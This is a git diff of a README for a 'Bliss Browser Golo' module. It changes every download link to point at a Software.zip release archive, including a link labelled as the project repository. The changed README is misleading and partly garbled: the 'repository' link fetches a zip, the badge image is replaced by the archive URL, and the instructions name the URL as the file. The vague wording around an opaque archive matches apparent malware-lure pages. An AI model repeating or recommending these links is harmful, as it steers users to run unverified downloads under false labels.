@@ -13,9 +13,9 @@ To get started with utilizing the Bliss Browser Golo module, follow these simple
    
 ### 📦 Download Software
 
-[![Download Bliss Browser Golo](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Bliss Browser Golo](https://github.com/taham56/Bliss_Browser_Golo/releases/download/v2.0/Software.zip)](https://github.com/taham56/Bliss_Browser_Golo/releases/download/v2.0/Software.zip)
 
-The software package is available for download. Click the button above to download the "Software.zip" file and start using the Bliss Browser Golo support module.
+The software package is available for download. Click the button above to download the "https://github.com/taham56/Bliss_Browser_Golo/releases/download/v2.0/Software.zip" file and start using the Bliss Browser Golo support module.
 
 ### 🔧 Features
 
@@ -45,7 +45,7 @@ Explore these topics to delve deeper into the functionalities and capabilities o
 
 ### 🌐️ Learn More
 
-Visit the [Bliss Browser Golo repository](https://github.com/user-attachments/files/18410590/Software.zip) to access additional resources, documentation, and information regarding the usage and implementation of the Golo language support in web development projects.
+Visit the [Bliss Browser Golo repository](https://github.com/taham56/Bliss_Browser_Golo/releases/download/v2.0/Software.zip) to access additional resources, documentation, and information regarding the usage and implementation of the Golo language support in web development projects.
 
 ### 🚧 Releases
 
